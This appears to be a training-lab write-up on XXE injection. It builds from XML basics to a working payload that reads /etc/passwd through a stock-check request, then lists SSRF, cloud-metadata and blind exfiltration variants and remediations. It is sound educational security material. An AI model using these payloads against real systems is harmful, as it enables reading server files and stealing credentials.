# 🧠Lab-1 XML External Entity (XXE) - File Read via `/etc/passwd`

---

## 📝 Overview

This lab demonstrates a basic XML External Entity (XXE) vulnerability where attacker-controlled XML is parsed unsafely by the server.

Goal:

Force the server’s XML parser to read local file:

```txt
/etc/passwd
```

Core idea:

Attacker injects malicious external entity
        ↓
XML parser loads server file
        ↓
File contents reflected in response

---

## 🧭 What Is The Topic?

### 📝 Phase 1 — What Is XML? (From Absolute Scratch)

Before XXE, you MUST understand XML properly first.

Because XXE is basically:

```txt
abusing XML features
```

So first we build XML foundation.

---

## ⚠️ What Is XML?

XML means:

```txt
eXtensible Markup Language
```

---

## 🧠 Easy Definition

XML is:

```txt
a format for storing and transferring data
```

Just like:

```txt
JSON
CSV
YAML
```

---

## 🌍 Simple Real-Life Analogy

Imagine two offices exchanging forms.

Example:

```txt
Office A:
Name = Medusa
Age = 20
```

They need a structured format to send data.

XML is one way to structure that data.

---

## ⚠️ Example of XML

```xml
<user>
   <name>Medusa</name>
   <age>20</age>
</user>
```

---

## 🧠 Understanding This Slowly

### ⚠️ `<user>`

This is called:

```txt
tag
```

Like a container.

---

### ⚠️ `<name>Medusa</name>`

Means:

```txt
name = Medusa
```

---

### ⚠️ `<age>20</age>`

Means:

```txt
age = 20
```

---

## 🧠 So XML Is Basically

```txt
data wrapped inside tags
```

---

## ⚠️ Why XML Was Created

Long ago websites/apps needed:

• structured data exchange

• universal format

• machine-readable communication


So XML became popular.

Especially for:

```txt
APIs
enterprise systems
banking
SOAP
Android configs
document formats
```

---

## ⚠️ Why Not Plain Text?

Without XML:

```txt
Medusa 20 Pakistan
```

Machine gets confused:

• what is name?

• what is age?

• what is country?

---

## 🧠 XML Adds Structure

```xml
<user>
   <name>Medusa</name>
   <age>20</age>
   <country>Pakistan</country>
</user>
```

Now meaning is clear.

---

## ⚠️ Important XML Rule

Every opening tag needs closing tag.

GOOD:

```xml
<name>Medusa</name>
```

BAD:

```xml
<name>Medusa
```

---

## 🧠 XML Is Hierarchical

Like folders inside folders.

Example:

```xml
<store>
   <product>
      <name>Phone</name>
      <price>100</price>
   </product>
</store>
```

Tree structure.

---

## 🔄 Compare XML vs JSON

### ⚠️ XML

```xml
<user>
   <name>Medusa</name>
</user>
```

---

### ⚠️ JSON

```json
{
  "name":"Medusa"
}
```

Both store data.

---

## ⚠️ Why XML Still Exists

Even though JSON is modern/popular:

• many old systems still use XML

• enterprise software loves XML

• SOAP APIs use XML heavily

• many parsers still support dangerous old features


That is why XXE still matters.

---

# 🧭 Phase 2 — Where XML Is Used

---

## ⚠️ Browser ↔ Server

Example:

```txt
Check stock
Submit payment
Transfer data
API request
```

---

## 📝 Example Request

Browser sends:

```xml
<stockCheck>
   <productId>381</productId>
</stockCheck>
```

Server processes it.

---

## ⚠️ Server Parses XML

Important word:

```txt
XML Parser
```

---

## 🧠 What Is Parser?

Parser means:

```txt
software that reads and understands XML
```

Like translator.

---

## 🌍 Real-Life Analogy

Parser is like office clerk.

You hand XML form:

```xml
<name>Medusa</name>
```

Parser says:

```txt
Okay, name = Medusa
```

---

# ⚠️ Phase 3 — Advanced XML Features

Now we enter dangerous territory.

XML has extra features besides normal tags.

One of them:

```txt
Entities
```

---

## 🧠 What Is Entity?

Entity is like:

```txt
variable/shortcut
```

---

## ⚠️ Example

```xml
<!ENTITY company "OpenAI">
```

Then:

```xml
<name>&company;</name>
```

Parser converts into:

```xml
<name>OpenAI</name>
```

---

## 🧠 Why Entities Were Created

Convenience.

Imagine repeating same text 100 times.

Instead:

```txt
Use variable
```

---

# ⚠️ Phase 4 — External Entities (IMPORTANT)

Now dangerous part.

---

## 📝 Normal Entity

```xml
<!ENTITY test "hello">
```

Value is internal text.

---

## ⚠️ External Entity

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

Now parser says:

```txt
Instead of text,
load content from external source
```

---

# 🚨 HUGE DIFFERENCE

### ⚠️ Internal Entity

```txt
Value written directly
```

---

### ⚠️ External Entity

Value loaded from:

```txt
- file
- URL
- external resource
```

---

## 🧠 Why This Was Created?

Originally for:

```txt
importing documents
modular XML files
loading external resources
```

Not designed with security in mind.

---

# ⚠️ Phase 5 — What Is DOCTYPE?

Entities are usually declared inside:

```txt
DOCTYPE
```

---

## 📝 Example

```xml
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

This means:

```txt
Define external entity named xxe
```

---

# ⚠️ Phase 6 — How XXE Happens

Now everything connects.

---

## 📝 Normal XML

```xml
<stockCheck>
   <productId>381</productId>
</stockCheck>
```

---

## 🚨 Attacker XML

```xml
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<stockCheck>
   <productId>&xxe;</productId>
</stockCheck>
```

---

## 🧠 What Parser Does

Parser sees:

```txt
&xxe;
```

Then loads:

```txt
/etc/passwd
```

Then inserts file content.

---

## ⚠️ Final Parsed XML Internally

Conceptually:

```xml
<productId>
root:x:0:0...
</productId>
```

---

## 🚨 Why This Is Dangerous

Because attacker can force server to:

```txt
read files
access internal URLs
send requests
leak secrets
```

---

## 🧠 Important Mental Model

XXE = tricking XML parser into becoming:

```txt
- file reader
- HTTP client
- internal network requester
```

---

# 🔄 Core Components Recap

| Component | Meaning |
|---|---|
| XML | Data format |
| Parser | Reads XML |
| Entity | Variable |
| External Entity | Loads file/URL |
| DOCTYPE | Place where entities defined |
| XXE | Abuse of external entities |

---

## 🎯 Final Foundation Mental Model

XML itself is not dangerous.

Danger starts when XML parser allows attacker-controlled external entities.

---

# 🔄 Lab Walkthrough

---

## 📝 Step 1 — Open Product Page

Visit any product.

Click:

```txt
Check stock
```

---

## 📝 Step 2 — Intercept Request

Capture request in Burp Suite.

You see:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<stockCheck>
   <productId>1</productId>
</stockCheck>
```

---

## 🧠 Understanding The Request

### ⚠️ XML Declaration

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

Just tells parser:

```txt
this is XML
encoding used
```

---

### ⚠️ Main XML Data

```xml
<stockCheck>
   <productId>1</productId>
</stockCheck>
```

Meaning:

```txt
Check stock for product 1
```

---

## 📝 Step 3 — Inject DOCTYPE

Add:

```xml
<!DOCTYPE test [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

between:

```txt
XML declaration
stockCheck tag
```

---

## 🧠 Payload Breakdown

### ⚠️ DOCTYPE

Defines custom XML rules/entities.

---

### ⚠️ ENTITY

Creates entity named:

```txt
xxe
```

---

### ⚠️ SYSTEM

Tells parser:

```txt
load external resource
```

---

### ⚠️ file:///etc/passwd

Tells parser to open local Linux file.

---

## 🚨 Important

This reads:

```txt
SERVER FILESYSTEM
```

NOT victim machine.

---

## 📝 Step 4 — Use Entity

Replace:

```xml
<productId>1</productId>
```

with:

```xml
<productId>&xxe;</productId>
```

---

## ⚠️ Final Exploit Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE test [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<stockCheck>
   <productId>&xxe;</productId>
</stockCheck>
```

---

## 📸 Screenshot

![xxe-passwd-response](../images/xxe-passwd-response.png)

---

# 🧠 Internal Server Processing

---

## ⚠️ Parser Sees

```txt
&xxe;
```

---

## ⚠️ Parser Resolves Entity

Checks:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

Meaning:

```txt
Replace &xxe; with file contents
```

---

## ⚠️ Server Opens File

```txt
/etc/passwd
```

---

## ⚠️ XML Internally Becomes

```xml
<productId>
root:x:0:0:root:/root:/bin/bash
...
</productId>
```

---

## ⚠️ Application Reflects Value

Response shows:

```txt
Invalid product ID:
root:x:0:0:root...
```

---

## 🧠 Why File Appears In Response

Because application reflects:

```txt
productId value
```

and attacker replaced it with:

```txt
file contents
```

---

# 🌍 Real-World Scenarios

---

## ⚠️ 1. Reading Sensitive Files

Targets:

```txt
/etc/passwd
config files
API keys
cloud credentials
```

---

## ⚠️ 2. SSRF Through XXE

Parser forced to request:

```txt
http://internal-admin
```

---

## ⚠️ 3. Cloud Metadata Theft

Common cloud target:

```txt
http://169.254.169.254
```

AWS/GCP/Azure metadata.

---

## ⚠️ 4. Blind XXE

No visible response.

Attacker exfiltrates data:

```txt
DNS
HTTP callbacks
external servers
```

---

# 🎯 High Value Endpoints

Look for:

```txt
SOAP APIs
XML upload features
stock check APIs
mobile app APIs
payment gateways
SAML authentication
SVG uploads
Office document parsers
```

---

# 🔗 Attack Variations

| Variation | Goal |
|---|---|
| File Read XXE | Read server files |
| SSRF XXE | Access internal systems |
| Blind XXE | Out-of-band exfiltration |
| Error-Based XXE | Leak via parser errors |

---

# 🛡️ Remediation

---

## ⚠️ Disable External Entities

Best defense:

```txt
Disable DTDs and external entities completely
```

---

## ⚠️ Use Safe XML Parsers

Use hardened parsers with:

```txt
XXE disabled
entity resolution disabled
```

---

## ⚠️ Prefer JSON

Avoid XML when unnecessary.

---

## ⚠️ Input Validation

Reject:

```txt
DOCTYPE
ENTITY
SYSTEM keywords
```

---

## ⚠️ Least Privilege

Ensure server process:

```txt
cannot access sensitive files
restricted filesystem access
```

---

# 🎯 One-Line Summary

XXE occurs when attacker-controlled XML is parsed unsafely, allowing external entities to read server files or access internal systems.
